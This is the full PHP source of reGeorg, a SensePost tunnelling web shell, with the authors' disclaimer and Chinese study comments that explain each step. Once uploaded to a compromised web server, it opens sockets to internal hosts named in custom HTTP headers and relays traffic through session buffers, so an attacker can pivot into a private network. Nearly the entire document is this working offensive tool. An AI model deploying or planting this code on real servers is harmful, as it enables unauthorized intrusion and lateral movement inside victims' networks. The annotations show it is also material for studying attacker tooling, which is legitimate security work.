<?php
/*                   _____ 
   ____   ______  __|___  |__  ______  _____  _____   ______
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
                    |_____|
                    ... every office needs a tool like Georg

  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad

Legal Disclaimer
Usage of reGeorg for attacking networks without consent
can be considered as illegal activity. The authors of
reGeorg assume no liability or responsibility for any
misuse or damage caused by this program.

If you find reGeorge on one of your servers you should
consider the server compromised and likely further compromise
to exist within your internal network.

For more information, see:
https://github.com/sensepost/reGeorg
*/

ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {			# 此处的处理方法无非是，将$_SERVER进行了一次处理，将_替换为了-，因为PHP接收请求头字段中的-会解析为_
                    foreach($rx_matches as $ak_key => $ak_val) {					# 然后以_为分割符打散为数组。然后进行将数组每个首字母进行大写的设置。最后再拼接起来
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[$arh_key] = $val;
            }
        }
        return( $arh );
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    exit("Georg says, 'All seems fine'");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	set_time_limit(0);
	$headers=apache_request_headers();
	$cmd = $headers["X-CMD"];
    switch($cmd){
		case "CONNECT":
			{
				$target = $headers["X-TARGET"];			# 接受http请求头中的，X-TARGET字段的值，此值为target字段
				$port = (int)$headers["X-PORT"];		# 接受X-PORT字段的值，作为目标主机的端口值

				#$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
				#if ($sock === false)
				#{
				#	header('X-STATUS: FAIL');
				#	header('X-ERROR: Failed creating socket');
				#	return;
				#}

        		$res = fsockopen($target, $port);							# 打开一个sock连接
				#$res = @socket_connect($sock, $target, $port);
                if ($res === false)												# 如果此TCP连接未打开的话，那么则会直接请求失败
				{
					header('X-STATUS: FAIL');
					header('X-ERROR: Failed connecting to target');
					return;
				}
				#socket_set_nonblock($res);

        		stream_set_blocking($res, false);             	# 设置为非阻塞模式，  
				@session_start();
				$_SESSION["run"] = true;
                $_SESSION["writebuf"] = "";
                $_SESSION["readbuf"] = "";
                ob_end_clean();								# ob_end_clean的作用是擦除输出。https://www.jianshu.com/p/4ba1774b1bce
                header('X-STATUS: OK');
                header("Connection: close");
                ignore_user_abort();				
                ob_start();							# 将所有的内容写入到缓冲区，				https://www.cnblogs.com/tianwengao/p/6885646.html
                $size = ob_get_length();
                header("Content-Length: $size");	# 手动的计算Content-Length的值
                ob_end_flush();						
                flush();							# 释放
				session_write_close();				# 关闭sessions的写入


						# 以上是建立一个请求，接下来的是php的代理部分。可以通过此处来进行代理的配置。就算客户端断开连接了后，也会自动的进行代理服务器的连接
				while ($_SESSION["run"])			# 
				{
					$readBuff = "";
					@session_start();
					$writeBuff = $_SESSION["writebuf"];
					$_SESSION["writebuf"] = "";
					session_write_close();			# 初次连接的话，实际上session中的writebuf并没有值
                    if ($writeBuff != "")			# 如果写入不为空的话，则进行writeBuff的写入操作。初次的连接并不会进入此处
					{								
            stream_set_blocking($res, false);		# 往php的socket套接字中写入高层的协议
						$i = fwrite($res, $writeBuff); #socket_write($sock, $writeBuff, strlen($writeBuff));
						if($i === false)				
						{
							@session_start();			# 如果连接不到的话，则在X-STATUS中返回连接状态
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
							header('X-ERROR: Failed writing socket');
						}
					}
          # stream_set_timeout($res, 1);
          stream_set_blocking($res, false);			# 设置为非阻塞模式
          while ($o = fgets($res, 10)) {				# 此处可能会被阻塞卡死在此处。上面的非阻塞模式的情况下$o会取带Flase，所以此处的循环不会执行
					if($o === false)
						{							# 未获取到连接信息
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
							header('X-STATUS: FAIL');
							header('X-ERROR: Failed reading from socket');
						}
						$readBuff .= $o;
					}
                    if ($readBuff!=""){
                        @session_start();
                        $_SESSION["readbuf"] .= $readBuff;			# 类似于的操作就像是 将readbuff存储到本地的session文件中，貌似是这样的
                        session_write_close();							# 数据存放在了sessions中。逻辑上说的话，下一次请求就会得到其内容	
                    }
                    #sleep(0.2);
				}
                fclose($res);
			}													# 逻辑上来说的话，如果sessions中存在。writebuff的话，那么就会进行请求。
			break;													# 然后把响应的结果保存在sessions中的readbuf中。
																		# 也就是说，事实上只会进行一次socks连接，如果能够建立连接的话，
																		# 那么php服务端就会向客户端返回200状态码和，X-STATUS: OK
		case "DISCONNECT":											
			{
                error_log("DISCONNECT recieved");
				@session_start();									# 所谓的关闭连接，就相当于session中的run的值被抛空。
				$_SESSION["run"] = false;
				session_write_close();
				return;
			}
			break;
		case "READ":
			{
				@session_start();					# 数据貌似通过session存放在了本地
				$readBuffer = $_SESSION["readbuf"];
                $_SESSION["readbuf"]="";
                $running = $_SESSION["run"];
				session_write_close();
                if ($running) {
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					echo $readBuffer;
					return;
				} else {
                    header('X-STATUS: FAIL');
                    header('X-ERROR: RemoteSocket read filed');
					return;
				}
			}
			break;
		case "FORWARD":
			{
                @session_start();
                $running = $_SESSION["run"];
				session_write_close();
                if(!$running){
                    header('X-STATUS: FAIL');
					header('X-ERROR: No more running, close now');
                    return;
                }
                header('Content-Type: application/octet-stream');
				$rawPostData = file_get_contents("php://input");
				if ($rawPostData) {
					@session_start();
					$_SESSION["writebuf"] .= $rawPostData;
					session_write_close();
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					return;
				} else {
					header('X-STATUS: FAIL');
					header('X-ERROR: POST request read filed');
				}
			}
			break;
	}
}
?>
